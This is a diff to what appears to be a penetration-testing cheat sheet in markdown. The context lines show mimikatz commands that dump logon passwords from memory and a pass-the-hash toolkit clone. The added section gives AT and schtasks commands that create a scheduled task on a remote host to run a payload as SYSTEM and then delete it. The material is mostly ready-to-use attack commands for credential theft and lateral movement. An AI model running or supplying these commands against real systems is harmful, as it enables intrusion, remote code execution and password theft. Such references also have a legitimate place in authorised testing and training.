@@ -71,6 +71,11 @@ unzip mimikatz_trunk.zip
 mimikatz.exe  
 (mimikatz) privilege::debug  
 (mimikatz) sekurlsa::logonPasswords full  
+## Schtask
+AT \\REMOTECOMPUTERNAME 12:34 "command to run"  
+schtasks /create /tn <taskname> /tr <taskrun> /sc <scheduleType MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE> /st <StartTime> /S <remote host> /RU <permissions of the specified user account>  
+schtasks /create /tn foobar /tr c:\wiSndows\temp\foobar.exe /sc once /st 00:00 /S host /RU System  
+schtasks /F /delete /tn foobar /S host  
 
 ## Pass-the-hash
 git clone https://github.com/byt3bl33d3r/pth-toolkit  
